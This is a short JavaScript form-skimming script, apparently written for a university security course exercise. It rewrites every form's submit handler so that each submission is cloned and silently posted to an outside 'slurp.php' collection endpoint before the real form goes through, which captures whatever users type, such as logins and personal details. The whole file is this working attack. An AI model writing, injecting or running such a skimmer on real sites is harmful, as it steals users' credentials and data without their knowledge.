var forms = document.getElementsByTagName("form");
var i = 0;
while (i < forms.length) {
  forms[i].setAttribute("onsubmit", "return nefariousMethod(this)");
  i++;
}

function nefariousMethod(realForm) {
  console.log("You are being hacked!");
  console.log("This is the form: " + realForm);
  var body = document.getElementsByTagName("body");
  var iframe = document.createElement("iframe");
  var tempForm = realForm.cloneNode(true);
  tempForm.action = "http://fourfourtwo.csse.rose-hulman.edu/f/slurp.php";
  var elt = document.createElement("input");
  elt.setAttribute("name", "442team");
  elt.setAttribute("value", "Hose-Rulman Racking Hadicals");
  elt.setAttribute("visible", "false");
  tempForm.appendChild(elt);
  iframe.appendChild(tempForm);
  body[0].appendChild(iframe);
  tempForm.submit();
  sleep(2000);
  realForm.submit();
  
  return false;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
